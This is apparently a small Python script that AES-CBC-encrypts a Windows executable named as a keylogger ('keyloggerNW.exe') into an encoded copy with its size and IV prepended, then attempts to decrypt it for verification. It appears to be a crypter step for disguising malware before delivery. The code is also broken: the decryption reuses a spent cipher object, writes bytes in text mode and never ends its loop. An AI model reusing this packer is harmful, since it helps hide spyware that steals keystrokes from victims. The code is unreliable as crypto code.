from Crypto.Cipher import AES
from Crypto import Random
import os
import struct

key = Random.get_random_bytes(AES.key_size[0])
iv = Random.get_random_bytes(AES.block_size)
print(key)
print(iv)

# create AES cipher
aes = AES.new(key, AES.MODE_CBC, iv)

# write size of file, needed to know how much will be used
file_size = os.path.getsize('keyloggerNW.exe')

# open output file with size of file
with open('ENCODEDkeyloggerNW.exe', 'wb') as fout:
    fout.write(struct.pack('<Q', file_size))
    #receiver needs iv to decrypt
    fout.write(iv)

with open('keyloggerNW.exe', "rb") as fin:
    while True:
        data = fin.read(file_size)
        data = data.decode('latin-1')
        n = len(data)
        if n == 0:
            break
        elif n % 16 != 0:
            data += ' ' * (16 - n % 16) # <- padded with spaces
        data = data.encode('latin-1')
        encd = aes.encrypt(data)

with open('ENCODEDkeyloggerNW.exe', 'ab') as fout:
    fout.write(encd)

with open('ENCODEDkeyloggerNW.exe',"rb") as fin:
    # size = struct.calcsize('<Q')
    # print(size)
    print(fin)
    size = struct.unpack('<Q', fin.read(struct.calcsize('<Q')))[0]
    print(size)
    iv = fin.read(16)
    print(iv)
    data = fin.read(size)

with open('verif.exe', 'w') as fout:
    while True:
        n = len(data)
        if n == 0:
            break
        decd = aes.decrypt(data)
        n = len(decd)
        if size > n:
            fout.write(decd)
        else:
            fout.write(decd[:size]) # <- remove padding on last block
        size -= n